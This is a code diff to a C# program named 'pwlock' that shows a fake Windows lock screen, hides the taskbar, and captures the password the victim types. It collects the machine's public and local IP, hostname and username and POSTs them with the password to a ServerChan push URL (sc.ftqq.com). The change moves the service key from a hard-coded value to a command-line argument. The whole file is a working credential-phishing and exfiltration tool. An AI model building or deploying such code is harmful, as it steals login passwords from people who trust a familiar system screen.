@@ -19,7 +19,7 @@ namespace pwlock
 
     public partial class LockScreenForm : Form
     {
-
+        string[] args = null;
 
         [DllImport("user32.dll")]
         internal static extern int SetWindowCompositionAttribute(IntPtr hwnd, ref WindowCompositionAttributeData data);
@@ -75,10 +75,10 @@ namespace pwlock
         }
 
 
-        public LockScreenForm()
+        public LockScreenForm(string[] args)
         {
             InitializeComponent();
-
+            this.args = args;
             Taskbar.Hide();
             GraphicsPath gp = new GraphicsPath();
 
@@ -292,15 +292,13 @@ namespace pwlock
             string Lip = Localip();
             string hostname = Dns.GetHostName();
             string hostfullnmae = Dns.GetHostEntry("localhost").HostName;
-            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("https://sc.ftqq.com/SCU94903T06578e4f95f006c815a2d6b764d77d1c5e9eabeb4e799.send");
+            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("https://sc.ftqq.com/" + args[0] + ".send");
             request.Method = "POST";
-            string postData = string.Format("text=老板，来活了~&desp=外网IP：{0} 内网IP：{1} 计算机名：{2} 计算机全名：{3} 当前用户：{4} 密码：{5}", Nip, Lip, hostname, hostfullnmae, Environment.UserName, PasswordTextBox.Text);
-            //Console.WriteLine(postData);
-            byte[] payload = System.Text.Encoding.UTF8.GetBytes(postData);
+            string postData = string.Format("外网IP：{0} 内网IP：{1} 计算机名：{2} 计算机全名：{3} 当前用户：{4} 密码：{5}", Nip, Lip, hostname, hostfullnmae, Environment.UserName, PasswordTextBox.Text);
+            byte[] payload = System.Text.Encoding.UTF8.GetBytes("text=老板，来活了~&desp=" + postData);
             request.ContentType = "application/x-www-form-urlencoded";
             request.ContentLength = payload.Length;
             Stream newStream = request.GetRequestStream();
-            //把请求数据写入请求流中
             newStream.Write(payload, 0, payload.Length);
             newStream.Close();
         }
